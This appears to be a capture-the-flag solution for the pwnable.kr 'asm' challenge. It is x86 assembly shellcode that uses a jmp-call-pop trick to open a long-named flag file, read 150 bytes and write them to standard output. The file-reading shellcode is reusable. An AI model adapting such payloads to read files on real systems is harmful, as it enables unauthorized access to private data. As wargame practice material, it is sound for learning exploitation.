
[SECTION .text]

global _start

_start:

	jmp short load_file_name
	
	starter:

	xor eax, eax	;initialize registers
	xor ebx, ebx
	xor edx, edx
	xor ecx, ecx


	mov al, 5					;system call open
	pop ebx						;ebx stores file name

	int 0x80

	xor ecx, ecx
	sub esp, 250				;ecx is the allocated buffer
	mov ecx, esp
	xor ebx, ebx
	mov ebx, eax				;ebx stores fd 
	
	xor eax, eax				;system call read
	mov al, 3

	xor edx, edx
	mov dl, 150					;count
	int 0x80 

	xor eax, eax
	mov al, 4 					;system call write	
	xor ebx, ebx
	mov bl, 1 		 		
	mov dl, 150		
	int 0x80		

	xor eax, eax 				;system call exit
    mov al, 1 		
    xor ebx, ebx
    int 0x80

    load_file_name:
    push ecx					;apply null termination
    call starter
    db '/root/Documents/itay/pwnable_kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'